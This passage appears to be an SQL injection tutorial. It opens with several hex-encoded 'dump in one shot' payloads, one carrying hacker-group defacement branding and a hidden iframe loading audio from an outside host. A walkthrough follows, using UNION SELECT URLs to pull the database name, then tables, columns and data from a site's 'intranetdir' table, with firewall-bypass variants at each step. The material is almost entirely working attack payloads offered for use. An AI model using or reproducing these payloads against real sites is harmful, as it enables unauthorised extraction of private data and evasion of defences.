/*!50000ConCAt*//**/(0x3c63656e7465723e3c696d67207372633d2268747470733a2f2f692e6962622e636f2f59666b4d4d6d342f4d43532e706e67222077696474683d2233353022206865696768743d22333530223e,0x3c63656e7465723e3c666f6e7420636f6c6f723d626c75652073697a653d343e3c623e3c696e733e3c6c6567656e64207374796c653d22636f6c6f723a7265643b223e3e2d3d3e20496e6a656374656420427920416c69656e205368616e75207c204d616c6c7520437962657220536f6c6469657273203c3d2d3c203c2f6c6567656e643e3c2f696e733e3c6d61726b3e3c666f6e7420636f6c6f723d626c75653e7b204d4353207d3c2f666f6e743c2f6d61726b3e203c2f666f6e743e3c2f63656e7465723e3c2f623e3c62723e3c6d617271756565206265686176696f723d227363726f6c6c2220646972656374696f6e3d22766572746963616c22207363726f6c6c616d6f756e743d22313022207363726f6c6c64656c61793d223630222077696474683d2231303025223e202d2d3e204d414c4c5520435942455220534f4c444945525320212121203c2d2d203c2f666f6e743e3c623e3c2f623e3c2f6d6172717565653e3c2f666f6e743e3c62723e3c62723e,0x3c63656e7465723e3c68333e3c666f6e7420636f6c6f723d22726564223e56657273696f6e203a3a3a,version/***/(),0x3c62723e,0x55736572203a3a3a,user/**/(),0x3c62723e,0x6461746162617365203a3a3a,database/**/(),0x3c62723e,0x55554944204b657973203a3a3a,UUID/**/(),0x3c62723e,0x546d70646972203a3a3a,@@tmpdir/**/,0x3c62723e,0x64617461646972203a3a3a,@@datadir/**/,0x3c62723e,0x62617365646972203a3a3a,@@basedir/**/,0x3c62723e,0x53796d6c696e6b203a3a3a,@@GLOBAL.have_symlink/**/,0x3c62723e,0x53534c203a3a3a,@@GLOBAL.have_ssl/**/,0x3c62723e,0x706f7274203a3a3a,@@port/**/,0x3c62723e,0x736f636b6574203a3a3a,@@SOCKET/**/,0x3c62723e,0x706c7567696e646972203a3a3a,@@PLUGIN_DIR/***/,0x3c62723e7761697474696d656f7574203a3a3a,@@WAIT_TIMEOUT/***/,0x3c62723e747970656f73203a3a3a,@@VERSION_COMPILE_MACHINE/**/,0x3c62723e736572766572206f73203a3a3a,@@VERSION_COMPILE_OS/**/,0x3c62723e736574646972203a3a3a,@@CHARACTER_SETS_DIR/**/,0x3c62723e7265636f7665726f7074696f6e73203a3a3a,@@MYISAM_RECOVER_OPTIONS/**/,0x3c62723e636f6e6e656374696f6e203a3a3a,@@COLLATION_CONNECTION/**/,0x3c62723e6572726f726c6f67203a3a3a,@@LOG_ERROR/*_**/,0x3c62723e486f73746e616d65203a3a3a,@@hostname,0x3c62723e,0x3c696e733e3c64656c3e7b3c7375703e414c21334e3c2f7375703e204d414c4c5520435942455220534f4c44494552533c7375703e5348414e553c2f7375703e207d3c2f64656c3e3c2f696e733e3c2f666f6e743e,0x3c63656e7465723e3c68333e3c666f6e7420636f6c6f723d22726564223e416c69656e205368616e7520c2a920323031393c2f666f6e743e3c2f68333e3c68333e3c7072653e3c666f6e7420636f6c6f723d22626c7565223e7c204d43537c3c2f7072653e3c2f68333e2093c68333e3c7072653e3c666f6e7420636f6c6f723d22677265656e223e207c204d616c6c7520437962657220536f6c64696572737c3c2f666f6e743e3c2f7072653e3c2f68333e2093c68333e3c7072653e3c666f6e7420636f6c6f723d22677265656e223e207c20414c21334e207c3c2f666f6e743e3c2f7072653e3c2f68333e209203c62723e203c64697620636c6173733d22666f6f746572223e3c666f6e7420636f6c6f723d227768697465223e26636f70793b2032303139202d20efbfbd203c62723e3c2f6469763e203c62723e203c2f63656e7465723e209203c646976207374796c653d22646973706c61793a206e6f6e653b223e203c696672616d652077696474683d22302522206865696768743d223022207363726f6c6c696e673d226e6f22206672616d65626f726465723d226e6f22206c6f6f703d22747275652220616c6c6f773d226175746f706c617922207372633d2268747470733a2f2f632e746f7034746f702e6e65742f6d5f313038383976373562312e6d7033223e3c2f696672616d653e)
```

```
concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/
```

```
(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)
```

```
/*!00000concat*/(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e496e6a6563746564206279204468346e692056757070616c61203c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d70696e6b2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20/*!00000from*/%20(select%20(@x:=0x00),(select%20(0)%20/*!00000from*/%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))
```

#### Building the query with DIOS to dump the whole database

In this case the following payload worked for me (from all the UNION SELECT queries): ```http://domain.com/index.php?id=1' Union Select 1,2,3,4-- -```  
Because the 1st column was being reflected to the website, we have to replace the "1" value in the payload with a DIOS payload.  

The final final payload will be (I chose the first DIOS payload):  
```http://domain.com/index.php?id=1' Union Select concat/*!(0x223e,version(),(select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/,2,3,4-- -```

If website does successfuly load, you will have all the database dumped in a nice format (DIOS does that).


### Dumping with the traditional method

In a traditional way of SQL Injection, you first have to dump database(), then tables(), then columns(), then data inside the columns. But you have to find the name of every table and columns.

#### Retrieving the database

- From UNION SELECT payload, the following payload worked for me: ```http://domain.com/index.php?id=1' Union Select 1,2,3,4-- -```
Because the 1st column was being reflected to the website, we have to replace the "1" value in the payload with **database()**.  

```http://domain.com/index.php?id=1' Union Select database(),2,3,4-- -```  

- The website will shows us the database name: **db109**  

![database_name_retrieved](https://i.imgur.com/xlUd1Gj.png)

#### Retrieving tables

- Convert the database name into 0xHEX: **0x6462313039**

- Since we know the database name, let's dump tables name using this payload (using group_concat() ):  
```sql
(SELECT+GROUP_CONCAT(table_name+SEPARATOR)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x6462313039)
```  

- Our payload will be: ```http://domain.com/index.php?id=1' Union Select (SELECT+GROUP_CONCAT(able_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x6462313039),2,3,4-- -```  

I've tested this query and most of the time it's effective, but there are some websites which for some reason, doesn't accept this query, so I came up with the following query to use in case of "emergency":  
```sql
(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x)
```
If WAF blocks the mentioned 2 queries, try using the following query (simple WAF bypass):  
```sql
(/*!%53ELECT*/+/*!50000GROUP_CONCAT(table_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.TABLES*//**//*!%57HERE*//**//*!TABLE_SCHEMA*//**/LIKE/**/DATABASE())
```

![table_dumped](https://i.imgur.com/cUbdS47.png)

#### Retriving columns

Now all the tables are all dumped. I will focus on the table names **intranetdir**, let's dump all the columns that this table has.

- Convert the table name into 0xHEX: **0x696e7472616e6574646972**

- We will use this payload group_concat() to dump the columns:  
```sql
(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x696e7472616e6574646972)
```
Alternatively you can use the following query as well (same function, different approach):  
```sql
(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME=0x696e7472616e6574646972)AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,column_name,0x3c62723e)))))x)
```
Where **0x696e7472616e6574646972** is 0xHEX of table name (**intranetdir**).  

- The final URL with Payload will be:  
```http://domain.com/index.php?id=1' Union Select (SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x696e7472616e6574646972),2,3,4-- -```  

![dumping_columns](https://i.imgur.com/pbIfSQV.png)

If WAF blocks the mentioned 2 queries, try using the following query (simple WAF bypass where **0x696e7472616e6574646972** is **intranetdir** in 0xHEX format):  
```sql
(/*!%53ELECT*/+/*!50000GROUP_CONCAT(column_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.COLUMNS*//**//*!%57HERE*//**//*!TABLE_NAME*//**/LIKE/**/0x696e7472616e6574646972)
```

#### Retrieving the data inside the column

All the columns of the name named **intranetdir** are dumped. In this case I will dump the data inside **name** column. For our final payload, we need to use database's name in 0xHEX, table's name in 0xHEX and column's name in 0xHEX.

- database: **db109**  
table: **intranetdir**  
column: **name**  

- You can use the following 3 queries to dump the data from the column **name**: 
```sql
(SELECT+GROUP_CONCAT(name+SEPARATOR+0x3c62723e)+FROM+db109.intranetdir)
```
```sql
(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(db109.intranetdir)WHERE(@x)IN(@x:=CONCAT(0x20,@x,name,0x3c62723e))))x)
```
```sql
(SELECT+GROUP_CONCAT(0x3c62723e,name)+FROM (db109.intranetdir))
```

- Let's use the first query (which I use the most). Assuming the 1st column is vulnerable, the final URL will be: 
```sql
http://domain.com/index.php?id=1' Union Select (SELECT+GROUP_CONCAT(name+SEPARATOR+0x3c62723e)+FROM+db109.intranetdir),2,3,4-- -
```

If the mentioned 3 queries are being blocked by WAF, consider using the following ones:  

```sql
(/*!%53ELECT*/+/*!50000GROUP_CONCAT(table_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.TABLES*//**//*!%57HERE*//**//*!TABLE_SCHEMA*//**/LIKE/**/DATABASE())
```

Note: **0x6e616d65** is **name** in 0xHEX format, convert it to your column name that you want to dump:  
```sql
(/*!%53ELECT*/+/*!50000GROUP_CONCAT(column_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.COLUMNS*//**//*!%57HERE*//**//*!TABLE_NAME*//**/LIKE/**/0x6e616d65)
```

```sql
(/*!%53ELECT*/(@x)FROM(/*!%53ELECT*/(@x:=0x00),(@NR:=0),(/*!%53ELECT*/(0)/*!%46ROM*/(/*!%49NFORMATION_%53CHEMA*/./*!%54ABLES*/)/*!%57HERE*/(/*!%54ABLE_%53CHEMA*//**/NOT/**/LIKE/**/0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=/*!CONCAT%0a(*/@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,/*!%74able_%6eame*/,0x3c62723e))))x)
```

- Now we have dumped all the data inside **name** column.
